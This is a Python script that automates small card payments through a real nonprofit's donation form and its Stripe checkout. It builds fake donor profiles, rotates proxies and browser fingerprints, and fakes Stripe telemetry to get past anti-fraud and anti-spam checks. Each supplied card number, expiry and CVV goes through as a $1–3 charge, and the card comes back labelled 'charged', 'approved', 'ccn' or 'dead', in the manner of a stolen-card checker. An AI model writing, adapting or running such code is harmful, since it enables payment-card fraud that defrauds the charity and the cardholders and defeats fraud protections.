import aiohttp
import asyncio
import time
import uuid
import random
import json
import re
import hashlib
from typing import List, Optional
from proxy_manager import proxy_manager

BASE = 'https://app.midsouthpride.org'
DONATE_URL = f'{BASE}/forms/donate/'
AJAX_URL = f'{BASE}/wp-admin/admin-ajax.php'
STRIPE_CONFIRM = 'https://api.stripe.com/v1/payment_intents'

_CHROME_VERS = [
    '120.0.6099.130','121.0.6167.85','122.0.6261.94','123.0.6312.58',
    '124.0.6367.91','125.0.6422.76','126.0.6478.55','127.0.6533.72',
    '128.0.6613.84','129.0.6668.58','130.0.6723.69','131.0.6778.85',
    '132.0.6834.83','133.0.6880.53','134.0.6943.70','135.0.7049.42',
    '136.0.7103.49','137.0.7151.55','138.0.7204.93','139.0.7259.50',
    '140.0.7310.40','141.0.7361.22','142.0.7400.66','143.0.7450.70',
    '144.0.7508.61','145.0.7550.90','146.0.7600.50',
]

_OS_LIST = [
    ('Windows NT 10.0; Win64; x64', '"Windows"'),
    ('Windows NT 11.0; Win64; x64', '"Windows"'),
    ('Macintosh; Intel Mac OS X 10_15_7', '"macOS"'),
    ('Macintosh; Intel Mac OS X 11_6_8', '"macOS"'),
    ('Macintosh; Intel Mac OS X 12_7_1', '"macOS"'),
    ('Macintosh; Intel Mac OS X 13_6_3', '"macOS"'),
    ('Macintosh; Intel Mac OS X 14_2_1', '"macOS"'),
    ('X11; Linux x86_64', '"Linux"'),
    ('X11; Ubuntu; Linux x86_64', '"Linux"'),
]

_FIRST = [
    'James','Robert','John','Michael','David','William','Richard','Joseph','Thomas',
    'Christopher','Charles','Daniel','Matthew','Anthony','Mark','Donald','Steven',
    'Andrew','Paul','Joshua','Kenneth','Kevin','Brian','George','Timothy','Ronald',
    'Jason','Edward','Jeffrey','Ryan','Jacob','Gary','Nicholas','Eric','Jonathan',
    'Stephen','Larry','Justin','Scott','Brandon','Benjamin','Samuel','Raymond',
    'Gregory','Frank','Alexander','Patrick','Jack','Dennis','Jerry','Tyler','Aaron',
    'Jose','Nathan','Henry','Peter','Adam','Douglas','Zachary','Walter',
]
_LAST = [
    'Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis','Rodriguez',
    'Martinez','Hernandez','Lopez','Gonzalez','Wilson','Anderson','Thomas','Taylor',
    'Moore','Jackson','Martin','Lee','Perez','Thompson','White','Harris','Sanchez',
    'Clark','Ramirez','Lewis','Robinson','Walker','Young','Allen','King','Wright',
    'Scott','Torres','Nguyen','Hill','Flores','Green','Adams','Nelson','Baker',
    'Hall','Rivera','Campbell','Mitchell','Carter','Roberts',
]
_DOMAINS = [
    'gmail.com','yahoo.com','outlook.com','hotmail.com','protonmail.com',
    'icloud.com','aol.com','mail.com','zoho.com','yandex.com',
]
_CITIES = [
    ('New York','New York','100'), ('Los Angeles','California','900'),
    ('Chicago','Illinois','606'), ('Houston','Texas','770'),
    ('Phoenix','Arizona','850'), ('Philadelphia','Pennsylvania','191'),
    ('San Antonio','Texas','782'), ('San Diego','California','921'),
    ('Dallas','Texas','752'), ('Austin','Texas','787'),
    ('Jacksonville','Florida','322'), ('Fort Worth','Texas','761'),
    ('Columbus','Ohio','432'), ('Charlotte','North Carolina','282'),
    ('Indianapolis','Indiana','462'), ('San Francisco','California','941'),
    ('Seattle','Washington','981'), ('Denver','Colorado','802'),
    ('Nashville','Tennessee','372'), ('Portland','Oregon','972'),
    ('Memphis','Tennessee','381'), ('Atlanta','Georgia','303'),
    ('Miami','Florida','331'), ('Boston','Massachusetts','021'),
    ('Detroit','Michigan','482'),
]
_STREETS = ['Main','Oak','Elm','Maple','Cedar','Pine','Walnut','Cherry','Birch','Willow','Ash','Spruce','Hickory','Poplar','Sycamore']
_SUFFIXES = ['St','Ave','Blvd','Dr','Ln','Way','Rd','Ct','Pl','Cir']
_ACCEPT_LANGS = [
    'en-US,en;q=0.9','en-US,en;q=0.9,es;q=0.8','en-US,en;q=0.8',
    'en-US,en;q=0.9,fr;q=0.7','en-GB,en;q=0.9,en-US;q=0.8',
    'en-US,en;q=0.9,de;q=0.7','en,en-US;q=0.9',
    'en-US,en;q=0.9,pt;q=0.6','en-US,en;q=0.9,ja;q=0.5',
]
_STRIPE_JS_HASHES = [
    'fcb1cc363c','6a9fcf70ea','a1b2c3d4e5','f5e4d3c2b1','1a2b3c4d5e',
    '9f8e7d6c5b','abc123def4','5e6f7a8b9c','d4c3b2a190','e7f8a9b0c1',
]
_ENTRY_REFS = [
    'https://www.google.com/',
    'https://www.google.com/search?q=midsouth+pride+donate',
    'https://www.google.com/search?q=donate+midsouthpride',
    'https://midsouthpride.org/',
    'https://app.midsouthpride.org/',
    'https://www.facebook.com/',
    'https://t.co/redirect',
    '',
]
_DONATE_AMOUNTS = ['1.00','1.50','2.00','2.50','3.00']


def _rand_hex(n):
    return uuid.uuid4().hex[:n*2]


def _gen_browser():
    cv = random.choice(_CHROME_VERS)
    major = cv.split('.')[0]
    os_str, platform = random.choice(_OS_LIST)
    ua = f'Mozilla/5.0 ({os_str}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv} Safari/537.36'
    sec_ua = f'"Chromium";v="{major}", "Not-A.Brand";v="24", "Google Chrome";v="{major}"'
    return ua, sec_ua, platform, '?0'


def _gen_profile():
    fn = random.choice(_FIRST)
    ln = random.choice(_LAST)
    sep = random.choice(['.', '_', '-', ''])
    num = random.randint(10, 9999)
    email = f'{fn.lower()}{sep}{ln.lower()}{num}@{random.choice(_DOMAINS)}'
    phone = f'({random.randint(201,989)}) {random.randint(200,999)}-{random.randint(1000,9999)}'
    city, state, zip_pre = random.choice(_CITIES)
    zip_code = f'{zip_pre}{random.randint(10,99)}'
    street = f'{random.randint(100,9999)} {random.choice(_STREETS)} {random.choice(_SUFFIXES)}'
    return fn, ln, email, phone, street, city, state, zip_code


def _gen_fingerprint():
    sjs = random.choice(_STRIPE_JS_HASHES)
    return {
        'guid': str(uuid.uuid4()),
        'muid': _rand_hex(16),
        'sid': _rand_hex(16),
        'sjs_ver': sjs,
        'session_id': f'elements_session_{_rand_hex(6)[:11]}',
        'config_id': str(uuid.uuid4()),
        'client_session_id': str(uuid.uuid4()),
        'time_on_page': str(random.randint(30000, 300000)),
    }


def _extract(html, pattern):
    m = re.search(pattern, html)
    return m.group(1) if m else None


def _build_multipart(fields, boundary):
    body = ''
    for key, val in fields:
        body += f'--{boundary}\r\nContent-Disposition: form-data; name="{key}"\r\n\r\n{val}\r\n'
    body += f'--{boundary}--\r\n'
    return body


async def check_card(cc: str, mm: str, yy: str, cvv: str, user_proxies: Optional[List[str]] = None) -> dict:
    start_time = time.time()

    if len(mm) == 1: mm = f'0{mm}'
    if len(yy) == 4: yy = yy[2:]

    proxy_url = proxy_manager.get_aiohttp_proxy(user_proxies)
    ua, sec_ua, platform, mobile = _gen_browser()
    fn, ln, email, phone, street, city, state, zip_code = _gen_profile()
    fp = _gen_fingerprint()
    donate_amt = random.choice(_DONATE_AMOUNTS)
    donate_fmt = f'${donate_amt}'
    lang = random.choice(_ACCEPT_LANGS)
    entry_ref = random.choice(_ENTRY_REFS)
    dnt = random.choice(['1', None])
    sec_gpc = random.choice(['1', '1', ''])

    base_h = {
        'user-agent': ua,
        'accept-language': lang,
        'accept-encoding': 'gzip, deflate',
        'sec-ch-ua': sec_ua,
        'sec-ch-ua-mobile': mobile,
        'sec-ch-ua-platform': platform,
        'sec-gpc': sec_gpc,
    }
    if dnt:
        base_h['dnt'] = dnt

    try:
        jar = aiohttp.CookieJar(unsafe=True)
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=60)

        async with aiohttp.ClientSession(cookie_jar=jar, connector=connector, timeout=timeout) as s:

            stripe_mid = str(uuid.uuid4())
            stripe_sid = str(uuid.uuid4())
            chatbase_id = str(uuid.uuid4())

            get_headers = {
                **base_h,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'upgrade-insecure-requests': '1',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'cross-site' if entry_ref else 'none',
                'sec-fetch-user': '?1',
            }
            if entry_ref:
                get_headers['referer'] = entry_ref

            async with s.get(DONATE_URL, headers=get_headers, proxy=proxy_url, allow_redirects=True) as r:
                page1_text = await r.text()
                jar.update_cookies({
                    '__stripe_mid': stripe_mid,
                    '__stripe_sid': stripe_sid,
                    'chatbase_anon_id': chatbase_id,
                }, r.url)

            gform_currency = _extract(page1_text, r"""gform_currency['"][^>]*value=['"]([^'"]+)['"]""")
            state_7 = _extract(page1_text, r"""state_7['"][^>]*value=['"]([^'"]+)['"]""")
            zero_spam = _extract(page1_text, r"""gf_zero_spam_token['"][^>]*value=['"]([^'"]+)['"]""")
            version_hash = _extract(page1_text, r"""version_hash['"][^>]*value=['"]([^'"]+)['"]""")
            stripe_key = _extract(page1_text, r'(pk_live_[A-Za-z0-9]+)')

            if not gform_currency or not state_7:
                return {'status': 'error', 'message': 'Failed to extract page tokens', 'time': round(time.time()-start_time, 2)}

            gform_unique_id = _rand_hex(7)

            boundary2 = f'----WebKitFormBoundary{_rand_hex(8)}'
            speed1 = random.randint(15000, 120000)
            fields2 = [
                ('gpps_page_progression_7', '0'),
                ('input_32', ''),
                ('input_31', 'Donation'),
                ('input_9', 'Donate Once'),
                ('input_25', 'Other Amount|0'),
                ('input_4', donate_fmt),
                ('input_1.3', ''),
                ('input_1.6', ''),
                ('input_2', ''),
                ('input_3', ''),
                ('input_8.1', ''),
                ('input_8.3', ''),
                ('input_8.4', state),
                ('input_8.5', ''),
                ('input_8.6', 'United States'),
                ('input_23', 'No'),
                ('input_5', donate_fmt),
                ('gform_submission_method', 'postback'),
                ('gform_theme', 'gravity-theme'),
                ('gform_style_settings', '[]'),
                ('is_submit_7', '1'),
                ('gform_submit', '7'),
                ('gform_currency', gform_currency),
                ('gform_unique_id', ''),
                ('state_7', state_7),
                ('gform_target_page_number_7', '2'),
                ('gform_source_page_number_7', '1'),
                ('gform_field_values', ''),
                ('gform_submission_speeds', f'{{"pages":{{"1":[{speed1}]}}}}'),
                ('gf_zero_spam_token', zero_spam or ''),
            ]
            post_h = {
                **base_h,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'content-type': f'multipart/form-data; boundary={boundary2}',
                'origin': BASE,
                'referer': DONATE_URL,
                'cache-control': 'max-age=0',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
            }
            async with s.post(DONATE_URL, headers=post_h, data=_build_multipart(fields2, boundary2), proxy=proxy_url) as r:
                page2_text = await r.text()

            gc2 = _extract(page2_text, r"""gform_currency['"][^>]*value=['"]([^'"]+)['"]""") or gform_currency
            st2 = _extract(page2_text, r"""state_7['"][^>]*value=['"]([^'"]+)['"]""") or state_7
            zs2 = _extract(page2_text, r"""gf_zero_spam_token['"][^>]*value=['"]([^'"]+)['"]""") or zero_spam

            boundary3 = f'----WebKitFormBoundary{_rand_hex(8)}'
            speed2 = random.randint(30000, 250000)
            fields3 = [
                ('gpps_page_progression_7', '1'),
                ('input_32', ''),
                ('input_31', 'Donation'),
                ('input_9', 'Donate Once'),
                ('input_25', 'Other Amount|0'),
                ('input_4', donate_fmt),
                ('input_1.3', fn),
                ('input_1.6', ln),
                ('input_2', email),
                ('input_3', phone),
                ('input_8.1', street),
                ('input_8.3', city),
                ('input_8.4', state),
                ('input_8.5', zip_code),
                ('input_8.6', 'United States'),
                ('input_23', 'No'),
                ('input_5', donate_fmt),
                ('gform_submission_method', 'postback'),
                ('gform_theme', 'gravity-theme'),
                ('gform_style_settings', '[]'),
                ('is_submit_7', '1'),
                ('gform_submit', '7'),
                ('gform_currency', gc2),
                ('gform_unique_id', gform_unique_id),
                ('state_7', st2),
                ('gform_target_page_number_7', '3'),
                ('gform_source_page_number_7', '2'),
                ('gform_field_values', ''),
                ('gform_submission_speeds', f'{{"pages":{{"2":[{speed2}]}}}}'),
                ('gf_zero_spam_token', zs2 or ''),
            ]
            post_h3 = {**post_h, 'content-type': f'multipart/form-data; boundary={boundary3}'}
            async with s.post(DONATE_URL, headers=post_h3, data=_build_multipart(fields3, boundary3), proxy=proxy_url) as r:
                page3_text = await r.text()

            gc3 = _extract(page3_text, r"""gform_currency['"][^>]*value=['"]([^'"]+)['"]""") or gc2
            st3 = _extract(page3_text, r"""state_7['"][^>]*value=['"]([^'"]+)['"]""") or st2
            zs3 = _extract(page3_text, r"""gf_zero_spam_token['"][^>]*value=['"]([^'"]+)['"]""") or zs2
            validate_nonce = _extract(page3_text, r"""validate_form_nonce["']:\s*["']([^"']+)["']""") or _extract(page1_text, r"""validate_form_nonce["']:\s*["']([^"']+)["']""")
            feed_id = _extract(page3_text, r'"feedId":(\d+)') or _extract(page1_text, r'"feedId":(\d+)') or '14'
            sk = _extract(page3_text, r'(pk_live_[A-Za-z0-9]+)') or stripe_key

            if not validate_nonce:
                return {'status': 'error', 'message': 'Failed to extract nonce', 'time': round(time.time()-start_time, 2)}
            if not sk:
                return {'status': 'error', 'message': 'Failed to extract Stripe key', 'time': round(time.time()-start_time, 2)}

            tracking_id = _rand_hex(4)
            v_hash = version_hash or _extract(page3_text, r"""version_hash['"][^>]*value=['"]([^'"]+)['"]""") or 'eb501f7aae9325d5b0a6d8229a073573'
            boundary4 = f'----WebKitFormBoundary{_rand_hex(8)}'
            speed3 = random.randint(20000, 300000)
            fields4 = [
                ('gpps_page_progression_7', '2'),
                ('input_32', ''),
                ('input_31', 'Donation'),
                ('input_9', 'Donate Once'),
                ('input_25', 'Other Amount|0'),
                ('input_4', donate_fmt),
                ('input_1.3', fn),
                ('input_1.6', ln),
                ('input_2', email),
                ('input_3', phone),
                ('input_8.1', street),
                ('input_8.3', city),
                ('input_8.4', state),
                ('input_8.5', zip_code),
                ('input_8.6', 'United States'),
                ('input_23', 'No'),
                ('input_5', donate_fmt),
                ('input_12.1', 'I agree to the <a href="/privacy-policy" target="_blank" rel="noopener">Privacy Policy</a>.'),
                ('gform_submission_method', 'postback'),
                ('gform_theme', 'gravity-theme'),
                ('gform_style_settings', '[]'),
                ('is_submit_7', '1'),
                ('gform_currency', gc3),
                ('gform_unique_id', gform_unique_id),
                ('state_7', st3),
                ('gform_target_page_number_7', '0'),
                ('gform_source_page_number_7', '3'),
                ('gform_field_values', ''),
                ('version_hash', v_hash),
                ('gform_submission_speeds', f'{{"pages":{{"3":[{speed3}]}}}}'),
                ('gf_zero_spam_token', zs3 or ''),
                ('version_hash', v_hash),
                ('action', 'gfstripe_validate_form'),
                ('feed_id', feed_id),
                ('form_id', '7'),
                ('tracking_id', tracking_id),
                ('payment_method', 'card'),
                ('nonce', validate_nonce),
            ]
            ajax_h = {
                **base_h,
                'accept': '*/*',
                'content-type': f'multipart/form-data; boundary={boundary4}',
                'origin': BASE,
                'referer': DONATE_URL,
                'x-requested-with': 'XMLHttpRequest',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            }
            async with s.post(AJAX_URL, headers=ajax_h, data=_build_multipart(fields4, boundary4), proxy=proxy_url) as r:
                ajax_text = await r.text()

            try:
                ajax_data = json.loads(ajax_text)
            except:
                return {'status': 'error', 'message': f'AJAX parse error: {ajax_text[:200]}', 'time': round(time.time()-start_time, 2)}

            pi_secret = None
            if ajax_data.get('data', {}).get('intent', {}).get('client_secret'):
                pi_secret = ajax_data['data']['intent']['client_secret']
            elif ajax_data.get('data', {}).get('client_secret'):
                pi_secret = ajax_data['data']['client_secret']

            resume_token = ajax_data.get('data', {}).get('resume_token', '')
            ajax_tracking = ajax_data.get('data', {}).get('tracking_id', tracking_id)

            if not pi_secret:
                return {'status': 'error', 'message': f'No PI created: {json.dumps(ajax_data)[:300]}', 'time': round(time.time()-start_time, 2)}

            pi_id = pi_secret.split('_secret_')[0]

            return_url = f'{DONATE_URL}?resume_token={resume_token}&feed_id={feed_id}&form_id=7&tracking_id={ajax_tracking}#gf_7'
            confirm_data = {
                'return_url': return_url,
                'payment_method_data[billing_details][address][line1]': street,
                'payment_method_data[billing_details][address][line2]': '',
                'payment_method_data[billing_details][address][city]': city,
                'payment_method_data[billing_details][address][state]': state,
                'payment_method_data[billing_details][address][postal_code]': zip_code,
                'payment_method_data[billing_details][address][country]': 'US',
                'payment_method_data[billing_details][email]': email,
                'payment_method_data[type]': 'card',
                'payment_method_data[card][number]': cc,
                'payment_method_data[card][cvc]': cvv,
                'payment_method_data[card][exp_month]': mm,
                'payment_method_data[card][exp_year]': yy,
                'payment_method_data[allow_redisplay]': 'unspecified',
                'payment_method_data[guid]': fp['guid'],
                'payment_method_data[muid]': fp['muid'],
                'payment_method_data[sid]': fp['sid'],
                'payment_method_data[payment_user_agent]': f"stripe.js/{fp['sjs_ver']}; stripe-js-v3/{fp['sjs_ver']}; payment-element; deferred-intent; autopm",
                'payment_method_data[referrer]': BASE,
                'payment_method_data[time_on_page]': fp['time_on_page'],
                'payment_method_data[client_attribution_metadata][client_session_id]': fp['client_session_id'],
                'payment_method_data[client_attribution_metadata][merchant_integration_source]': 'elements',
                'payment_method_data[client_attribution_metadata][merchant_integration_subtype]': 'payment-element',
                'payment_method_data[client_attribution_metadata][merchant_integration_version]': '2021',
                'payment_method_data[client_attribution_metadata][payment_intent_creation_flow]': 'deferred',
                'payment_method_data[client_attribution_metadata][payment_method_selection_flow]': 'automatic',
                'payment_method_data[client_attribution_metadata][elements_session_id]': fp['session_id'],
                'payment_method_data[client_attribution_metadata][elements_session_config_id]': fp['config_id'],
                'expected_payment_method_type': 'card',
                'key': sk,
                'client_secret': pi_secret,
            }

            confirm_h = {
                'user-agent': ua,
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'accept-language': lang,
                'sec-ch-ua': sec_ua,
                'sec-ch-ua-mobile': mobile,
                'sec-ch-ua-platform': platform,
            }

            async with s.post(f'{STRIPE_CONFIRM}/{pi_id}/confirm', headers=confirm_h, data=confirm_data) as r:
                confirm_text = await r.text()
                confirm_status = r.status

            try:
                result = json.loads(confirm_text)
            except:
                return {'status': 'error', 'message': f'Stripe parse error', 'time': round(time.time()-start_time, 2)}

            elapsed = round(time.time() - start_time, 2)
            raw_response = confirm_text[:2000]

            if result.get('status') == 'succeeded':
                pm = result.get('payment_method', {})
                card_obj = pm.get('card', {}) if isinstance(pm, dict) else {}
                brand = card_obj.get('brand', '?').upper()
                country = card_obj.get('country', '?')
                funding = card_obj.get('funding', '?')
                last4 = card_obj.get('last4', cc[-4:])
                card_info = f'{brand} {funding} [{country}]'
                return {'status': 'charged', 'message': f'Charged {donate_fmt} | {pi_id} | {card_info}', 'time': elapsed, 'raw': raw_response}

            if result.get('status') == 'requires_action':
                next_action = result.get('next_action', {})
                pm = result.get('payment_method', {})
                card_obj = pm.get('card', {}) if isinstance(pm, dict) else {}
                brand = card_obj.get('brand', '?').upper()
                country = card_obj.get('country', '?')
                funding = card_obj.get('funding', '?')
                card_info = f'{brand} {funding} [{country}]'
                if next_action.get('type') == 'redirect_to_url':
                    return {'status': 'approved', 'message': f'3DS Required | {pi_id} | {card_info}', 'time': elapsed, 'raw': raw_response}
                return {'status': 'approved', 'message': f'Requires Action: {next_action.get("type","")} | {pi_id} | {card_info}', 'time': elapsed, 'raw': raw_response}

            if result.get('error'):
                err = result['error']
                dc = err.get('decline_code') or err.get('code', '')
                msg = err.get('message', 'Card error')[:100]
                pm_obj = err.get('payment_method', {})
                card_obj = pm_obj.get('card', {}) if isinstance(pm_obj, dict) else {}
                if not card_obj:
                    pi_obj = err.get('payment_intent', {})
                    lpe = pi_obj.get('last_payment_error', {}) if isinstance(pi_obj, dict) else {}
                    pm2 = lpe.get('payment_method', {}) if isinstance(lpe, dict) else {}
                    card_obj = pm2.get('card', {}) if isinstance(pm2, dict) else {}

                brand = card_obj.get('brand', '?').upper()
                country = card_obj.get('country', '?')
                funding = card_obj.get('funding', '?')
                last4 = card_obj.get('last4', cc[-4:])
                card_info = f'{brand} {funding} [{country}]'

                msg_lower = msg.lower()
                if 'insufficient_funds' in dc or 'insufficient funds' in msg_lower:
                    return {'status': 'ccn', 'message': f'insufficient_funds | {card_info}', 'time': elapsed, 'raw': raw_response}
                if 'incorrect_cvc' in dc or 'incorrect cvc' in msg_lower:
                    return {'status': 'ccn', 'message': f'incorrect_cvc | {card_info}', 'time': elapsed, 'raw': raw_response}
                if any(x in dc for x in ['expired_card', 'lost_card', 'stolen_card', 'pickup_card']):
                    return {'status': 'dead', 'message': f'{dc} | {card_info}', 'time': elapsed, 'raw': raw_response}
                if any(x in dc for x in ['incorrect_number', 'invalid_number', 'invalid_expiry']):
                    return {'status': 'dead', 'message': f'{dc} | {card_info}', 'time': elapsed, 'raw': raw_response}

                return {'status': 'dead', 'message': f'{dc} | {msg} | {card_info}' if dc else f'{msg} | {card_info}', 'time': elapsed, 'raw': raw_response}

            return {'status': 'error', 'message': f'Unknown: {confirm_text[:200]}', 'time': elapsed, 'raw': raw_response}

    except asyncio.TimeoutError:
        return {'status': 'error', 'message': 'Timeout', 'time': round(time.time()-start_time, 2)}
    except aiohttp.ClientError as e:
        return {'status': 'error', 'message': f'Connection error: {str(e)[:60]}', 'time': round(time.time()-start_time, 2)}
    except Exception as e:
        return {'status': 'error', 'message': str(e)[:100], 'time': round(time.time()-start_time, 2)}
